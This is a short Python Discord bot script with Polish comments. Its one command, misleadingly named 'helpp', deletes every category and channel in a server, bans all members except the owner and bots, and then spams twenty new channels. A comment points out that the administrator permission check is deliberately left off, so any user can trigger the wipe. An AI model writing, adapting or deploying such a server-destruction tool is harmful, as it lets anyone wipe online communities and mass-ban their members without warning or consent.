import discord
from discord.ext import commands
from config import prefix, token

intents = discord.Intents.all()
nb = commands.Bot(command_prefix=prefix, intents=intents)
nazwa = "bot" # Tutaj wpisz nazwe dla kanału

@nb.event
async def on_ready():
    print(f"{nb.user} Online")

@nb.command()
#Tutaj macie permisje dla administratora: @commands.has_permissions(administrator=True) ale po co ¯\_(ツ)_/¯.
async def helpp(ctx):
    for category in ctx.guild.categories:
        await category.delete()
    for channel in ctx.guild.channels:
        await channel.delete()
    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot: # To potrzebne by bot nie zbanował właściciela i botów :>.
            await member.ban(reason="Bla bla bla, wpisz co chcesz.")
    for i in range(20):
        await ctx.guild.create_text_channel(name=nazwa)
   
nb.run(token)
